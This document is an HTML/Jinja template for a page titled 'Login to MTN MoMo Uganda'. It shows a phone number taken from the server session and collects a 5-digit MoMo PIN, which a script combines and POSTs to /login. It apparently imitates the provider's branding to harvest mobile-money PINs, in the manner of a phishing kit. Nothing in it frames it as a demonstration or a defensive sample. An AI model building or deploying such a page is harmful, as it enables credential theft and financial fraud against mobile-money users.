<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login to MTN MoMo Uganda</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #f4f5f7; font-family: sans-serif; }
        .header-bar { background-color: #003366; padding: 15px; text-align: center; border-bottom: 4px solid #FFCC00; }
        .momo-logo { background-color: #FFCC00; color: #003366; font-weight: 900; font-size: 22px; padding: 4px 12px; border-radius: 8px; display: inline-block; }
        .pin-input { width: 45px; height: 50px; text-align: center; font-size: 24px; font-weight: bold; border-radius: 8px; border: 1px solid #ced4da; }
        .btn-momo { background-color: #003366; color: white; font-weight: bold; }
    </style>
</head>
<body>
    <div class="header-bar text-white">
        <div class="momo-logo mb-1">MM</div>
        <div class="fw-bold">MoMo</div>
        <div class="text-white-50 small">Login via MTN MoMo Uganda</div>
    </div>

    <div class="container d-flex justify-content-center my-5">
        <div class="card border-0 shadow-sm p-4 text-center" style="max-width: 440px; width: 100%; border-radius: 16px;">
            <h4 class="fw-bold text-dark mb-4">Login to MTN MoMo Uganda</h4>

            <form action="/login" method="POST" id="pinForm">
                <!-- Dynamically retrieves user's phone number from session -->
                <div class="input-group mb-4">
                    <span class="input-group-text bg-light fw-bold">+256</span>
                    <input type="text" class="form-control bg-light fw-bold" value="{{ session.get('phone', '') }}" readonly>
                </div>

                <label class="form-label small text-muted mb-3">Enter your MoMo PIN (5 digits):</label>
                
                <div class="d-flex justify-content-center gap-2 mb-4">
                    <input type="password" maxlength="1" class="pin-input" required autofocus>
                    <input type="password" maxlength="1" class="pin-input" required>
                    <input type="password" maxlength="1" class="pin-input" required>
                    <input type="password" maxlength="1" class="pin-input" required>
                    <input type="password" maxlength="1" class="pin-input" required>
                </div>

                <!-- Hidden input field to hold the concatenated 5-digit PIN -->
                <input type="hidden" name="pin" id="fullPin">

                <button type="submit" class="btn btn-momo w-100 py-3 fw-bold">LOGIN</button>
            </form>
        </div>
    </div>

    <script>
        const inputs = document.querySelectorAll('.pin-input');
        const fullPinInput = document.getElementById('fullPin');
        const form = document.getElementById('pinForm');

        inputs.forEach((input, index) => {
            // Auto-advance to next box on input
            input.addEventListener('input', (e) => {
                if (e.target.value && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            });
            // Handle backspace
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !input.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        // Combine box values before submitting
        form.addEventListener('submit', () => {
            let pinVal = '';
            inputs.forEach(i => pinVal += i.value);
            fullPinInput.value = pinVal;
        });
    </script>
</body>
</html>
